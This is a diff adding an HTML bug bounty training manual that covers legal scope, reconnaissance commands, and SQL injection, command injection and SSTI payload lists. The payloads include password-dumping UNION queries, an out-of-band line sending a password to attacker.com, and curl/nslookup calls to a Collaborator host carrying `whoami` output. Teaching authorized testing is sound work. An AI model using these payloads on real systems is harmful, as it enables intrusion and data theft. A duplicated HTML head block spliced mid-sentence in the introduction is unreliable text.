@@ -1,0 +1,2045 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>The Complete Bug Bounty Field Manual</title>
+<link rel="stylesheet" href="style.css"> 
+</head>
+<body>
+
+<div id="progress"></div>
+<button id="sb-toggle" onclick="toggleSidebar()">☰ MENU</button>
+
+<!-- ═══════════════════ SIDEBAR ═══════════════════ -->
+<nav id="sidebar">
+  <div class="sb-logo">
+    <div class="title">BUG BOUNTY<br>PLAYBOOK</div>
+    <div class="sub">COMPLETE EDITION v3.0</div>
+  </div>
+  <div class="sb-search">
+    <input type="text" placeholder="Search topics..." oninput="filterNav(this.value)" id="nav-search">
+  </div>
+  <div class="sb-nav" id="sb-nav-links">
+    <div class="sb-section-label">Getting Started</div>
+    <a href="#hero">Introduction</a>
+    <a href="#legal">Legal Framework</a>
+    <a href="#methodology">Testing Methodology</a>
+
+    <div class="sb-section-label">Reconnaissance</div>
+    <a href="#passive-recon">Passive Recon</a>
+    <a href="#active-recon">Active Recon</a>
+    <a href="#attack-surface">Attack Surface Mapping</a>
+
+    <div class="sb-section-label">Injection Attacks</div>
+    <a href="#sqli" class="sub-link">SQL Injection</a>
+    <a href="#cmdi" class="sub-link">Command Injection</a>
+    <a href="#ssti" class="sub-link">SSTI</a>
+    <a href="#xxe" class="sub-link">XXE Injection</a>
+    <a href="#ldap" class="sub-link">LDAP / NoSQL Injection</a>
+
+    <div class="sb-section-label">Client-Side Attacks</div>
+    <a href="#xss" class="sub-link">XSS (All Types)</a>
+    <a href="#csrf" class="sub-link">CSRF</a>
+    <a href="#clickjacking" class="sub-link">Clickjacking</a>
+    <a href="#open-redirect" class="sub-link">Open Redirect</a>
+    <a href="#prototype" class="sub-link">Prototype Pollution</a>
+
+    <div class="sb-section-label">Access Control</div>
+    <a href="#idor" class="sub-link">IDOR / BOLA</a>
+    <a href="#auth" class="sub-link">Broken Auth</a>
+    <a href="#jwt" class="sub-link">JWT Attacks</a>
+    <a href="#oauth" class="sub-link">OAuth Misconfig</a>
+    <a href="#priv-esc" class="sub-link">Privilege Escalation</a>
+
+    <div class="sb-section-label">Server-Side Attacks</div>
+    <a href="#ssrf" class="sub-link">SSRF</a>
+    <a href="#path-traversal" class="sub-link">Path Traversal / LFI</a>
+    <a href="#file-upload" class="sub-link">File Upload Bypass</a>
+    <a href="#deserialization" class="sub-link">Insecure Deserialization</a>
+    <a href="#race-condition" class="sub-link">Race Conditions</a>
+    <a href="#smuggling" class="sub-link">HTTP Smuggling</a>
+    <a href="#cache-poison" class="sub-link">Cache Poisoning</a>
+
+    <div class="sb-section-label">Infrastructure</div>
+    <a href="#cors" class="sub-link">CORS Misconfig</a>
+    <a href="#subdomain-takeover" class="sub-link">Subdomain Takeover</a>
+    <a href="#cloud" class="sub-link">Cloud Misconfigs</a>
+    <a href="#dns" class="sub-link">DNS Attacks</a>
+
+    <div class="sb-section-label">Modern Targets</div>
+    <a href="#api" class="sub-link">API Security</a>
+    <a href="#graphql" class="sub-link">GraphQL Attacks</a>
+    <a href="#websocket" class="sub-link">WebSockets</a>
+    <a href="#mobile-api" class="sub-link">Mobile API Testing</a>
+
+    <div class="sb-section-label">Business Logic</div>
+    <a href="#business-logic">Business Logic Flaws</a>
+
+    <div class="sb-section-label">Tooling & Workflow</div>
+    <a href="#burp">Burp Suite Mastery</a>
+    <a href="#tools">Complete Tool Arsenal</a>
+    <a href="#automation">Automation & Scripting</a>
+
+    <div class="sb-section-label">Reporting</div>
+    <a href="#reporting">Writing Reports</a>
+    <a href="#platforms">Platforms & Programs</a>
+    <a href="#mindset">Hunter's Mindset</a>
+  </div>
+</nav>
+
+<!-- ═══════════════════ MAIN ═══════════════════ -->
+<main id="main">
+
+<!-- HERO -->
+<section class="hero" id="hero">
+  <div class="grid-bg"></div>
+  <div class="hero-tag">Complete Field Manual</div>
+  <h1>THE <span class="accent">BUG BOUNTY</span><br>HUNTER'S PLAYBOOK</h1>
+  <p class="hero-desc">
+    Every technique, tool, methodology, and mindset needed to<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>The Complete Bug Bounty Field Manual</title>
+ find vulnerabilities in any web application on the planet. Built for ethical researchers who operate within the law.
+  </p>
+  <div class="hero-stats">
+    <div class="stat"><div class="n">40+</div><div class="l">Vulnerability Types</div></div>
+    <div class="stat"><div class="n">200+</div><div class="l">Payloads & Techniques</div></div>
+    <div class="stat"><div class="n">80+</div><div class="l">Tools Covered</div></div>
+    <div class="stat"><div class="n">∞</div><div class="l">Attack Surface</div></div>
+  </div>
+</section>
+
+<!-- ═══ SECTION: LEGAL ═══ -->
+<section class="section" id="legal">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 01</div>
+    <h2>Legal Framework & Authorization</h2>
+    <p class="section-intro">The foundation of ethical hacking. No technique in this book matters if you don't have authorization. Unauthorized testing is a criminal offense in virtually every country.</p>
+  </div>
+
+  <div class="box box-red">
+    <strong>⚠ Non-Negotiable Rule</strong>
+    Never test any system you do not own or have explicit written permission to test. The CFAA (US), Computer Misuse Act (UK), IT Act (India), and equivalent laws worldwide make unauthorized computer access a serious crime regardless of intent.
+  </div>
+
+  <div class="chapter">
+    <h3>Finding Authorized Targets</h3>
+    <h4>Bug Bounty Platforms</h4>
+    <p>These platforms host programs where companies explicitly invite researchers to test their systems:</p>
+    <div class="three-col">
+      <div class="mini-card">
+        <div class="mc-title">HackerOne</div>
+        <p>Largest platform. Home to Twitter, Uber, DoD, Goldman Sachs. Has public & private programs.</p>
+      </div>
+      <div class="mini-card">
+        <div class="mc-title">Bugcrowd</div>
+        <p>Strong enterprise focus. Includes Mastercard, Tesla, Atlassian, Pinterest.</p>
+      </div>
+      <div class="mini-card">
+        <div class="mc-title">Intigriti</div>
+        <p>Europe-focused. Strong EU regulatory compliance programs. Excellent payouts.</p>
+      </div>
+      <div class="mini-card">
+        <div class="mc-title">Synack</div>
+        <p>Invite-only, vetted researchers. Higher payouts, US government contracts.</p>
+      </div>
+      <div class="mini-card">
+        <div class="mc-title">YesWeHack</div>
+        <p>French-based. Strong European programs, good for GDPR-related findings.</p>
+      </div>
+      <div class="mini-card">
+        <div class="mc-title">Open Bug Bounty</div>
+        <p>Responsible disclosure without requiring permission. Coordinated disclosure model.</p>
+      </div>
+    </div>
+
+    <h4>Vulnerability Disclosure Policies (VDP)</h4>
+    <p>Many companies have VDPs without formal bounty programs. Always check:</p>
+    <div class="code-wrap">
+      <div class="code-label">Where to Find VDPs</div>
+      <pre><span class="cm"># Standard locations to check</span>
+https://target.com/security.txt
+https://target.com/.well-known/security.txt
+https://target.com/responsible-disclosure
+https://target.com/bug-bounty
+https://target.com/security
+https://target.com/vulnerability-disclosure
+
+<span class="cm"># Google Dorks to find VDPs</span>
+site:target.com "responsible disclosure"
+site:target.com "bug bounty"
+site:target.com "security.txt"</pre>
+    </div>
+
+    <h4>Understanding Scope</h4>
+    <p>Read the program brief exhaustively. Scope violations are grounds for banning and legal action.</p>
+    <div class="two-col">
+      <div class="mini-card">
+        <div class="mc-title" style="color:var(--g)">✓ In Scope Indicators</div>
+        <ul class="blist">
+          <li>Listed *.example.com domains</li>
+          <li>Specific IP ranges (CIDR notation)</li>
+          <li>Named mobile apps</li>
+          <li>Listed API endpoints</li>
+          <li>Specific product lines</li>
+        </ul>
+      </div>
+      <div class="mini-card">
+        <div class="mc-title" style="color:var(--red)">✗ Typical Exclusions</div>
+        <ul class="blist red">
+          <li>DoS/DDoS of any kind</li>
+          <li>Social engineering staff</li>
+          <li>Physical access attacks</li>
+          <li>Third-party integrations</li>
+          <li>Automated scanning at scale</li>
+          <li>Self-XSS requiring admin</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ SECTION: METHODOLOGY ═══ -->
+<section class="section" id="methodology">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 02</div>
+    <h2>Testing Methodology</h2>
+    <p class="section-intro">Structure separates elite hunters from beginners. A systematic approach ensures full coverage and reproducible results.</p>
+  </div>
+
+  <div class="chapter">
+    <h3>The Hunter's Workflow</h3>
+    <div class="phase-timeline">
+      <div class="phase-item">
+        <div class="phase-bullet"><div class="pb-dot"></div><div class="pb-line"></div></div>
+        <div class="phase-content">
+          <h5>Phase 1 — Target Selection & Authorization</h5>
+          <p>Select a program within your skill level. Read every word of the brief. Understand scope, reward ranges, exclusions, and response SLAs before touching anything.</p>
+        </div>
+      </div>
+      <div class="phase-item">
+        <div class="phase-bullet"><div class="pb-dot"></div><div class="pb-line"></div></div>
+        <div class="phase-content">
+          <h5>Phase 2 — Passive Reconnaissance</h5>
+          <p>Map the full attack surface without sending a single packet to target systems. OSINT, historical data, public sources, GitHub, DNS records.</p>
+        </div>
+      </div>
+      <div class="phase-item">
+        <div class="phase-bullet"><div class="pb-dot"></div><div class="pb-line"></div></div>
+        <div class="phase-content">
+          <h5>Phase 3 — Active Reconnaissance</h5>
+          <p>Interact with target systems to identify running services, technologies, entry points, and behaviors. Crawl, probe, enumerate.</p>
+        </div>
+      </div>
+      <div class="phase-item">
+        <div class="phase-bullet"><div class="pb-dot"></div><div class="pb-line"></div></div>
+        <div class="phase-content">
+          <h5>Phase 4 — Vulnerability Identification</h5>
+          <p>Systematically test each entry point using proven techniques. Follow the OWASP Top 10 and go beyond. Document everything in real time.</p>
+        </div>
+      </div>
+      <div class="phase-item">
+        <div class="phase-bullet"><div class="pb-dot"></div><div class="pb-line"></div></div>
+        <div class="phase-content">
+          <h5>Phase 5 — Exploitation & Proof of Concept</h5>
+          <p>Confirm the vulnerability is real and impactful. Build minimal PoC. Never go beyond what's needed to demonstrate the issue.</p>
+        </div>
+      </div>
+      <div class="phase-item">
+        <div class="phase-bullet"><div class="pb-dot"></div><div class="pb-line"></div></div>
+        <div class="phase-content">
+          <h5>Phase 6 — Documentation & Reporting</h5>
+          <p>Write a professional, reproducible report. Include CVSS score, impact analysis, and remediation advice. Submit through official channels.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ SECTION: PASSIVE RECON ═══ -->
+<section class="section" id="passive-recon">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 03</div>
+    <h2>Passive Reconnaissance</h2>
+    <p class="section-intro">The art of learning everything about a target without ever touching it. Passive recon is completely safe and often reveals the most valuable attack surface before a single packet is sent.</p>
+  </div>
+
+  <div class="chapter">
+    <h3>Subdomain Enumeration</h3>
+    <p>Forgotten subdomains host old software, dev environments, and exposed admin panels. This is often where bugs live.</p>
+
+    <div class="code-wrap">
+      <div class="code-label">Subdomain Discovery - Full Workflow</div>
+      <pre><span class="cm"># 1. Passive sources (no direct interaction)</span>
+<span class="ck">subfinder</span> -d target.com -all -recursive -o subs.txt
+<span class="ck">amass</span> enum -passive -d target.com -o amass.txt
+<span class="ck">assetfinder</span> --subs-only target.com >> subs.txt
+<span class="ck">findomain</span> -t target.com -q >> subs.txt
+
+<span class="cm"># 2. Certificate transparency logs (crt.sh)</span>
+curl -s "<span class="cs">https://crt.sh/?q=%.target.com&output=json</span>" | \
+  jq -r '.[].name_value' | sort -u >> subs.txt
+
+<span class="cm"># 3. DNS bruteforce with wordlist</span>
+<span class="ck">puredns</span> bruteforce /wordlists/best-dns-wordlist.txt target.com >> subs.txt
+
+<span class="cm"># 4. Resolve live hosts only</span>
+<span class="ck">dnsx</span> -l subs.txt -o live-subs.txt -a
+
+<span class="cm"># 5. Check for live HTTP(S)</span>
+<span class="ck">httpx</span> -l live-subs.txt -o live-web.txt -status-code -title -tech-detect</pre>
+    </div>
+
+    <h4>Google Dorking (OSINT)</h4>
+    <p>Google's index contains treasure. These operators expose hidden endpoints, sensitive files, and misconfigured servers.</p>
+    <div class="code-wrap">
+      <div class="code-label">High-Value Google Dorks</div>
+      <pre><span class="cm"># Find subdomains</span>
+site:target.com -www
+
+<span class="cm"># Exposed sensitive files</span>
+site:target.com ext:env OR ext:log OR ext:bak OR ext:sql
+site:target.com ext:xml OR ext:conf OR ext:config
+site:target.com filetype:pdf "confidential" OR "internal"
+
+<span class="cm"># Login/admin panels</span>
+site:target.com inurl:admin OR inurl:login OR inurl:dashboard
+site:target.com inurl:wp-admin OR inurl:phpmyadmin
+
+<span class="cm"># API endpoints</span>
+site:target.com inurl:api OR inurl:v1 OR inurl:v2
+site:target.com "api_key" OR "apikey" OR "access_token"
+
+<span class="cm"># Error pages (leak tech stack)</span>
+site:target.com "Warning: mysql_" OR "ORA-" OR "SQL syntax"
+site:target.com "Internal Server Error" OR "stack trace"
+
+<span class="cm"># GitHub leaks</span>
+site:github.com "target.com" "api_key"
+site:github.com "target.com" "password"
+site:github.com "target.com" ".env"</pre>
+    </div>
+
+    <h4>Source Code & Git Recon</h4>
+    <div class="code-wrap">
+      <div class="code-label">GitHub / GitLab Secret Hunting</div>
+      <pre><span class="cm"># Search GitHub for exposed secrets</span>
+<span class="ck">trufflehog</span> github --org=TargetOrg --only-verified
+<span class="ck">gitleaks</span> detect --repo-url=https://github.com/target/repo
+
+<span class="cm"># Search keywords on GitHub</span>
+<span class="cm"># Use: github.com/search?q=target.com+password&type=code</span>
+"target.com" password
+"target.com" secret
+"target.com" api_key
+"target.com" BEGIN RSA PRIVATE KEY
+"target.com" AKIA  <span class="cm"># AWS Access Key prefix</span>
+
+<span class="cm"># Wayback Machine - find deleted endpoints</span>
+<span class="ck">waybackurls</span> target.com | sort -u | tee wayback.txt
+<span class="ck">gau</span> target.com | sort -u >> wayback.txt
+
+<span class="cm"># Find juicy paths in historical URLs</span>
+cat wayback.txt | grep -E "\.(php|asp|aspx|jsp|json|xml|env|bak|sql)"
+cat wayback.txt | grep -E "(admin|config|debug|test|dev|staging)"
+cat wayback.txt | grep "?" | grep -E "(id=|user=|file=|path=)"</pre>
+    </div>
+
+    <h4>WHOIS & DNS Intelligence</h4>
+    <div class="code-wrap">
+      <div class="code-label">DNS Recon Commands</div>
+      <pre><span class="cm"># Full DNS enumeration</span>
+<span class="ck">dnsx</span> -d target.com -a -aaaa -cname -mx -txt -ns -ptr
+
+<span class="cm"># Reverse IP lookup (find sibling sites on same server)</span>
+<span class="ck">hakrevdns</span> 93.184.216.34
+
+<span class="cm"># Zone transfer attempt (misconfigured DNS leaks all records)</span>
+dig axfr @ns1.target.com target.com
+
+<span class="cm"># Find origin IP behind Cloudflare/CDN</span>
+<span class="cm"># Check: SecurityTrails, Shodan, old DNS records</span>
+<span class="ck">nslookup</span> target.com 8.8.8.8
+curl https://securitytrails.com/domain/target.com/history/a</pre>
+    </div>
+
+    <h4>Shodan & Censys (Internet-Wide Scanners)</h4>
+    <div class="code-wrap">
+      <div class="code-label">Shodan Queries</div>
+      <pre><span class="cm"># Find all IPs for an org</span>
+org:"Target Corp" http.title:"Login"
+org:"Target Corp" port:8080 OR port:8443 OR port:9200
+
+<span class="cm"># Find exposed services</span>
+hostname:target.com port:27017  <span class="cm"># MongoDB</span>
+hostname:target.com port:9200   <span class="cm"># Elasticsearch</span>
+hostname:target.com port:6379   <span class="cm"># Redis</span>
+hostname:target.com port:5432   <span class="cm"># PostgreSQL</span>
+
+<span class="cm"># Exposed panels</span>
+http.title:"phpMyAdmin" org:"Target Corp"
+http.title:"Jenkins" org:"Target Corp"
+http.title:"Kibana" org:"Target Corp"</pre>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ SECTION: ACTIVE RECON ═══ -->
+<section class="section" id="active-recon">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 04</div>
+    <h2>Active Reconnaissance</h2>
+    <p class="section-intro">Direct interaction with the target to fingerprint technologies, map endpoints, and identify entry points. Every request you make is potentially logged — be precise and deliberate.</p>
+  </div>
+
+  <div class="chapter">
+    <h3>Technology Fingerprinting</h3>
+    <div class="code-wrap">
+      <div class="code-label">Tech Stack Detection</div>
+      <pre><span class="cm"># HTTP headers reveal technology</span>
+curl -I https://target.com
+<span class="cm"># Look for: Server, X-Powered-By, X-Generator, X-Framework</span>
+
+<span class="cm"># Wappalyzer CLI</span>
+<span class="ck">wappalyzer</span> https://target.com --pretty
+
+<span class="cm"># whatweb</span>
+<span class="ck">whatweb</span> -a 3 https://target.com
+
+<span class="cm"># nuclei - tech detection templates</span>
+<span class="ck">nuclei</span> -u https://target.com -t technologies/ -o tech.txt</pre>
+    </div>
+
+    <h3>Directory & Endpoint Discovery</h3>
+    <div class="code-wrap">
+      <div class="code-label">Content Discovery</div>
+      <pre><span class="cm"># Directory brute force</span>
+<span class="ck">ffuf</span> -u https://target.com/FUZZ -w /wordlists/raft-large-dirs.txt \
+  -fc 404 -mc all -o dirs.json -of json
+
+<span class="cm"># File extension hunting</span>
+<span class="ck">ffuf</span> -u https://target.com/FUZZ -w /wordlists/raft-large-files.txt \
+  -e .php,.asp,.aspx,.jsp,.bak,.old,.txt,.xml,.json \
+  -fc 404
+
+<span class="cm"># API endpoint discovery</span>
+<span class="ck">ffuf</span> -u https://api.target.com/FUZZ -w /wordlists/api-endpoints.txt \
+  -H "Content-Type: application/json"
+
+<span class="cm"># Parameter discovery (find hidden params)</span>
+<span class="ck">arjun</span> -u https://target.com/search -m GET
+<span class="ck">x8</span> -u "https://target.com/page" -w /wordlists/params.txt
+
+<span class="cm"># JS file analysis (endpoints in JS)</span>
+<span class="ck">getJS</span> --url https://target.com | xargs -I% curl -s % | \
+  grep -oP '(\/[a-z0-9_\-\/]+)+'</pre>
+    </div>
+
+    <h4>JavaScript Analysis — A Goldmine</h4>
+    <p>Modern SPAs store API endpoints, tokens, feature flags, and internal routes in JavaScript bundles. Always extract and analyze JS files.</p>
+    <div class="code-wrap">
+      <div class="code-label">JS Recon</div>
+      <pre><span class="cm"># Extract all JS files from a site</span>
+<span class="ck">hakrawler</span> -url https://target.com -js | tee js-files.txt
+
+<span class="cm"># Find API endpoints in JS</span>
+cat js-files.txt | xargs -I% curl -s % | \
+  <span class="ck">grep</span> -oE '(\"|\`)(\/[a-zA-Z0-9_\/\-]+)(\"|\`)' | sort -u
+
+<span class="cm"># Look for secrets in JS</span>
+cat js-files.txt | xargs -I% curl -s % | \
+  <span class="ck">grep</span> -iE "(api[_-]?key|token|secret|password|auth)" | head -50
+
+<span class="cm"># Linkfinder - specialized tool for JS endpoints</span>
+<span class="ck">linkfinder</span> -i https://target.com -d -o cli</pre>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ SECTION: ATTACK SURFACE ═══ -->
+<section class="section" id="attack-surface">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 05</div>
+    <h2>Attack Surface Mapping</h2>
+    <p class="section-intro">Before testing, catalog every input, every integration, every trust boundary. A comprehensive map prevents missed vulnerabilities.</p>
+  </div>
+
+  <div class="chapter">
+    <h3>Entry Point Catalog</h3>
+    <div class="three-col">
+      <div class="mini-card">
+        <div class="mc-title">URL Parameters</div>
+        <ul class="blist">
+          <li>GET parameters: <code>?id=1&user=admin</code></li>
+          <li>Path parameters: <code>/user/1234/profile</code></li>
+          <li>Fragment identifiers</li>
+          <li>Matrix parameters</li>
+        </ul>
+      </div>
+      <div class="mini-card">
+        <div class="mc-title">Request Body</div>
+        <ul class="blist">
+          <li>Form fields (POST)</li>
+          <li>JSON payloads</li>
+          <li>XML bodies</li>
+          <li>Multipart form data</li>
+          <li>Raw binary data</li>
+        </ul>
+      </div>
+      <div class="mini-card">
+        <div class="mc-title">HTTP Headers</div>
+        <ul class="blist">
+          <li>Host header</li>
+          <li>Referer & Origin</li>
+          <li>User-Agent</li>
+          <li>X-Forwarded-For</li>
+          <li>Custom headers</li>
+          <li>Cookie values</li>
+        </ul>
+      </div>
+      <div class="mini-card">
+        <div class="mc-title">File Inputs</div>
+        <ul class="blist">
+          <li>File name</li>
+          <li>File content</li>
+          <li>MIME type header</li>
+          <li>File metadata (EXIF)</li>
+        </ul>
+      </div>
+      <div class="mini-card">
+        <div class="mc-title">Auth Mechanisms</div>
+        <ul class="blist">
+          <li>Login forms</li>
+          <li>OAuth flows</li>
+          <li>JWT tokens</li>
+          <li>API keys</li>
+          <li>Password reset</li>
+          <li>MFA bypass</li>
+        </ul>
+      </div>
+      <div class="mini-card">
+        <div class="mc-title">Indirect Inputs</div>
+        <ul class="blist">
+          <li>Email content</li>
+          <li>Imported documents</li>
+          <li>Webhook payloads</li>
+          <li>Third-party callbacks</li>
+          <li>Database entries</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ VULNERABILITIES SECTION ═══ -->
+<!-- SQL INJECTION -->
+<section class="section" id="sqli">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 06 — INJECTION ATTACKS</div>
+    <h2>SQL Injection</h2>
+    <p class="section-intro">SQLi occurs when user-supplied input is included in SQL queries without proper sanitization. One of the oldest and most impactful vulnerability classes — still found everywhere in 2024.</p>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-card-head" onclick="toggle(this)">
+      <div class="vuln-icon sev-critical">CRIT</div>
+      <div><div class="vuln-card-title">Classic / Error-Based SQLi</div><div class="vuln-card-subtitle">Direct error output reveals database structure</div></div>
+      <button class="expand-btn">EXPAND ↓</button>
+    </div>
+    <div class="vuln-card-body">
+      <p>The server includes your input directly in a SQL query. Error messages reveal the database type, version, and structure.</p>
+      <h4>Detection Payloads</h4>
+      <div class="code-wrap">
+        <div class="code-label">Injection Test Strings</div>
+        <pre><span class="cm"># Basic break characters — look for errors or behavior change</span>
+<span class="ce">'</span>
+<span class="ce">''</span>
+<span class="ce">`</span>
+<span class="ce">;</span>
+<span class="ce">-- -</span>
+<span class="ce">#</span>
+<span class="ce">/**/</span>
+<span class="ce">1' OR '1'='1</span>
+<span class="ce">1' OR 1=1-- -</span>
+<span class="ce">' OR 'x'='x</span>
+<span class="ce">admin'-- -</span>
+
+<span class="cm"># MySQL error trigger</span>
+<span class="ce">extractvalue(1,concat(0x7e,version()))</span>
+
+<span class="cm"># PostgreSQL error trigger</span>
+<span class="ce">1 AND 1=CAST(version() AS int)</span>
+
+<span class="cm"># MSSQL error trigger</span>
+<span class="ce">1; SELECT * FROM sysobjects-- -</span></pre>
+      </div>
+      <h4>Union-Based Extraction</h4>
+      <div class="code-wrap">
+        <div class="code-label">UNION Attack Flow</div>
+        <pre><span class="cm"># Step 1: Find column count</span>
+' ORDER BY 1-- -
+' ORDER BY 2-- -   <span class="cm"># increment until error</span>
+' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL-- -  <span class="cm"># add NULLs until success</span>
+
+<span class="cm"># Step 2: Find string columns</span>
+' UNION SELECT 'a',NULL,NULL-- -
+' UNION SELECT NULL,'a',NULL-- -
+
+<span class="cm"># Step 3: Extract data</span>
+' UNION SELECT table_name,NULL FROM information_schema.tables-- -
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
+' UNION SELECT username,password FROM users-- -</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-card-head" onclick="toggle(this)">
+      <div class="vuln-icon sev-critical">CRIT</div>
+      <div><div class="vuln-card-title">Blind SQLi (Boolean & Time-Based)</div><div class="vuln-card-subtitle">No error output — infer data from behavior changes</div></div>
+      <button class="expand-btn">EXPAND ↓</button>
+    </div>
+    <div class="vuln-card-body">
+      <p>No errors visible. Infer information by asking true/false questions (boolean) or measuring response time (time-based).</p>
+      <div class="code-wrap">
+        <div class="code-label">Boolean Blind</div>
+        <pre><span class="cm"># If TRUE → normal response | FALSE → different (empty/error)</span>
+<span class="ce">1' AND 1=1-- -</span>   <span class="cm"># → normal</span>
+<span class="ce">1' AND 1=2-- -</span>   <span class="cm"># → different (SQLI confirmed)</span>
+
+<span class="cm"># Extract data character by character</span>
+<span class="ce">1' AND SUBSTRING(username,1,1)='a'-- -</span>
+<span class="ce">1' AND ASCII(SUBSTRING(username,1,1))>97-- -</span>
+
+<span class="cm"># Check database name length</span>
+<span class="ce">1' AND LENGTH(database())=6-- -</span></pre>
+      </div>
+      <div class="code-wrap">
+        <div class="code-label">Time-Based Blind (No visible response difference)</div>
+        <pre><span class="cm"># MySQL: SLEEP()</span>
+<span class="ce">1'; IF(1=1, SLEEP(5), 0)-- -</span>
+<span class="ce">1' AND SLEEP(5)-- -</span>
+
+<span class="cm"># PostgreSQL</span>
+<span class="ce">1'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -</span>
+
+<span class="cm"># MSSQL</span>
+<span class="ce">1'; IF(1=1) WAITFOR DELAY '0:0:5'-- -</span>
+
+<span class="cm"># SQLmap automation</span>
+sqlmap -u "https://target.com/item?id=1" --dbs --batch --level=5 --risk=3
+sqlmap -u "https://target.com/item?id=1" -D dbname -T users --dump</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-card-head" onclick="toggle(this)">
+      <div class="vuln-icon sev-critical">CRIT</div>
+      <div><div class="vuln-card-title">Out-of-Band & Second-Order SQLi</div><div class="vuln-card-subtitle">Data exfiltrated via DNS/HTTP or delayed execution</div></div>
+      <button class="expand-btn">EXPAND ↓</button>
+    </div>
+    <div class="vuln-card-body">
+      <p><strong>Out-of-Band:</strong> Force the DB server to make an outbound DNS/HTTP call carrying extracted data to your server. <strong>Second-Order:</strong> Payload is stored safely, executed dangerously later.</p>
+      <div class="code-wrap">
+        <div class="code-label">Out-of-Band (MySQL)</div>
+        <pre><span class="cm"># MySQL — LOAD_FILE + INTO DUMPFILE</span>
+<span class="ce">'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\x'))-- -</span>
+
+<span class="cm"># Use Burp Collaborator to catch DNS pingback</span>
+<span class="ce">1'; EXEC master..xp_dirtree '//BURP_COLLAB.burpcollaborator.net/a'-- -  </span><span class="cm">(MSSQL)</span></pre>
+      </div>
+      <div class="box box-amber">
+        <strong>Second-Order SQLi Pattern</strong>
+        Register with username: <span class="payload">admin'-- -</span> → Application stores it "safely" → Later, another query uses the username without sanitizing → SQLi executes in second query context.
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- COMMAND INJECTION -->
+<section class="section" id="cmdi">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 07</div>
+    <h2>Command Injection</h2>
+    <p class="section-intro">When user input is passed to a system shell, an attacker can execute arbitrary OS commands with the web server's privileges. Often leads to full server compromise.</p>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-card-head" onclick="toggle(this)">
+      <div class="vuln-icon sev-critical">CRIT</div>
+      <div><div class="vuln-card-title">OS Command Injection — Full Coverage</div><div class="vuln-card-subtitle">Chaining operators, blind, out-of-band</div></div>
+      <button class="expand-btn">EXPAND ↓</button>
+    </div>
+    <div class="vuln-card-body">
+      <p>Look for features that trigger server-side processes: ping tools, file converters, DNS lookups, image processors, PDF generators.</p>
+      <div class="code-wrap">
+        <div class="code-label">Injection Operators (Linux & Windows)</div>
+        <pre><span class="cm"># Command chaining separators</span>
+<span class="ce">;whoami</span>           <span class="cm"># execute after</span>
+<span class="ce">&whoami</span>           <span class="cm"># background then execute</span>
+<span class="ce">&&whoami</span>          <span class="cm"># execute if first succeeds</span>
+<span class="ce">||whoami</span>          <span class="cm"># execute if first fails</span>
+<span class="ce">|whoami</span>           <span class="cm"># pipe output</span>
+<span class="ce">`whoami`</span>          <span class="cm"># backtick execution</span>
+<span class="ce">$(whoami)</span>         <span class="cm"># subshell</span>
+<span class="ce">%0awhoami</span>         <span class="cm"># URL-encoded newline</span>
+
+<span class="cm"># Windows-specific</span>
+<span class="ce">& whoami</span>
+<span class="ce">| whoami</span>
+<span class="ce">; whoami</span>
+
+<span class="cm"># Context examples</span>
+<span class="cm"># Ping field: 127.0.0.1;whoami</span>
+<span class="cm"># Email field: test@test.com;ls</span>
+<span class="cm"># Filename: file.pdf;id</span></pre>
+      </div>
+      <div class="code-wrap">
+        <div class="code-label">Blind Command Injection Detection</div>
+        <pre><span class="cm"># Time-based blind</span>
+127.0.0.1<span class="ce">; sleep 5</span>
+127.0.0.1<span class="ce"> && ping -c 5 127.0.0.1</span>
+
+<span class="cm"># Out-of-band via DNS (use Burp Collaborator)</span>
+127.0.0.1<span class="ce">; nslookup $(whoami).COLLAB.burpcollaborator.net</span>
+127.0.0.1<span class="ce">; curl http://COLLAB.burpcollaborator.net/$(whoami)</span>
+
+<span class="cm"># Write output to web-accessible file</span>
+127.0.0.1<span class="ce">; id > /var/www/html/output.txt</span>
+<span class="cm"># Then visit: https://target.com/output.txt</span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- SSTI -->
+<section class="section" id="ssti">
+  <div class="section-header">
+    <div class="section-num">CHAPTER 08</div>
+    <h2>Server-Side Template Injection (SSTI)</h2>
+    <p class="section-intro">When user input is embedded in a server-side template and evaluated. Can lead to Remote Code Execution depending on the template engine.</p>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-card-head" onclick="toggle(this)">
+      <div class="vuln-icon sev-critical">CRIT</div>
+      <div><div class="vuln-card-title">SSTI Detection & Engine Identification</div><div class="vuln-card-subtitle">Jinja2, Twig, Freemarker, Smarty, Pebble</div></div>
+      <button class="expand-btn">EXPAND ↓</button>
+    </div>
+    <div class="vuln-card-body">
+      <div class="code-wrap">
+        <div class="code-label">Universal Detection Payload</div>
+        <pre><span class="cm"># Send these in name fields, search, messages — look for math result in response</span>
+<span class="ce">{{7*7}}</span>          → <span class="cv">49</span>  (Jinja2, Twig)
+<span class="ce">${7*7}</span>          → <span class="cv">49</span>  (FreeMarker, Thymeleaf)
+<span class="ce"><%= 7*7 %></span>      → <span class="cv">49</span>  (ERB/Ruby)
